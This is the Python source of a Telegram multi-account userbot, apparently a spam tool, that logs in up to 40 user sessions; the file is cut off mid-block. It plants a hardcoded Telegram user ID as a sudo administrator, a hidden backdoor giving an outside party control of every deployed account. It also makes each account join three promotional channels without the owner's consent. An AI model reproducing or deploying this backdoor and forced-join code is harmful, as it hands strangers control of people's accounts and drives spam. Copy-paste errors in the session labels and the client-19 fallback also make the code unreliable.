
# Copyright © 2021 

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

UBversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5125042013 not in SUDO_USERS:
    SUDO_USERS.append(5125042013)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def RaichUB():
    global Sex
    global Sex2
    global Sex3
    global Sex5
    global Sex4
    global Sex6
    global Sex7
    global Sex8
    global Sex9
    global Sex10
    global Sex11
    global Sex12
    global Sex13
    global Sex14
    global Sex15
    global Sex16
    global Sex17
    global Sex18
    global Sex19
    global Sex20
    global Sex21
    global Sex22
    global Sex23
    global Sex25
    global Sex24
    global Sex26
    global Sex27
    global Sex28
    global Sex29
    global Sex30
    global Sex31
    global Sex32
    global Sex33
    global Sex34
    global Sex35
    global Sex36
    global Sex37
    global Sex38
    global Sex39
    global Sex40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Sex = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Sex.start()
            botme = await Sex.get_me()
            await Sex(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Sex = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "RaichUBspam"
        Sex = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Sex2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Sex2.start()
            await Sex2(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex2(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex2(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "RaichUBspam"
        Sex2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Sex3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  Sex3.start()
            await Sex3(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex3(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex3(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "RaichUBspam"
        Sex3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Sex4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Sex4.start()
            await Sex4(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex4(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex4(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "RaichUBspam"
        Sex4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Sex5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Sex5.start()
            await Sex5(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex5(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex5(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "RaichUBspam"
        Sex5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Sex6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Sex6.start()
            await Sex6(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex6(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex6(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "RaichUBspam"
        Sex6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Sex7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Sex7.start()
            await Sex7(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex7(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex7(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "RaichUBspam"
        Sex7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Sex8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Sex8.start()
            await Sex8(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex8(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex8(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "RaichUBspam"
        Sex8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Sex9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Sex9.start()
            await Sex9(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex9(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex9(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "RaichUBspam"
        Sex9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Sex10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Sex10.start()
            await Sex10(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex10(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex10(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "RaichUBspam"
        Sex10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Sex11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Sex11.start()
            await Sex11(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex11(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex11(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "RaichUBspam"
        Sex11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Sex12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Sex12.start()
            await Sex12(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex12(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex12(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "RaichUBspam"
        Sex12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Sex13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Sex13.start()
            await Sex13(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex13(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex13(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "RaichUBspam"
        Sex13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Sex14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Sex14.start()
            await Sex14(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex14(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex14(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "RaichUBspam"
        Sex14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Sex15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Sex15.start()
            await Sex15(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex15(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex15(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "RaichUBspam"
        Sex15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Sex16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Sex16.start()
            botme = await Sex16.get_me()
            await Sex16(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex16(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex16(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "RaichUBspam"
        Sex16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Sex17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Sex17.start()
            botme = await Sex17.get_me()
            await Sex17(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex17(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex17(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "RaichUBspam"
        Sex17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Sex18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Sex18.start()
            botme = await Sex18.get_me()
            await Sex18(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex18(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex18(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "RaichUBspam"
        Sex18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Sex19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Sex19.start()
            botme = await Sex19.get_me()
            await Sex19(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex19(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex19(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "RaichUBspam"
        Sex19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Sex20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Sex20.start()
            botme = await Sex20.get_me()
            await Sex20(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex20(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex20(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "RaichUBspam"
        Sex20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Sex21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Sex21.start()
            botme = await Sex21.get_me()
            await Sex21(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex21(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex21(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "RaichUBspam"
        Sex21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Sex22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Sex22.start()
            await Sex22(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex22(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex22(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "RaichUBspam"
        Sex22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Sex23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Sex23.start()
            await Sex23(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex23(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex23(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "RaichUBspam"
        Sex23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Sex24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Sex24.start()
            await Sex24(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex24(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex24(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "RaichUBspam"
        Sex24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Sex25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Sex25.start()
            await Sex25(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex25(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex25(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "RaichUBspam"
        Sex25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        Sex26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Sex26.start()
            await Sex26(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex26(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex26(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "RaichUBspam"
        Sex26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Sex27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Sex27.start()
            await Sex27(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex27(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex27(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "RaichUBspam"
        Sex27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Sex28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Sex28.start()
            await Sex28(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex28(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex28(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "RaichUBspam"
        Sex28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Sex29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Sex29.start()
            await Sex29(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex29(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex29(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "RaichUBspam"
        Sex29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Sex30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Sex30.start()
            await Sex30(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex30(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex30(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "RaichUBspam"
        Sex30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Sex31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Sex31.start()
            await Sex31(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex31(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex31(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "RaichUBspam"
        Sex31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Sex32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Sex32.start()
            await Sex32(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex32(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex32(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "RaichUBspam"
        Sex32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Sex33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Sex33.start()
            await Sex33(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex33(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex33(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "RaichUBspam"
        Sex33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Sex34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Sex34.start()
            await Sex34(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex34(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex34(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "RaichUBspam"
        Sex34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Sex35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Sex35.start()
            await Sex35(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex35(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex35(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botme = await Sex35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "RaichUBspam"
        Sex35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Sex36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Sex36.start()
            botme = await Sex36.get_me()
            await Sex36(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex36(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex36(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "RaichUBspam"
        Sex36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex36.start()
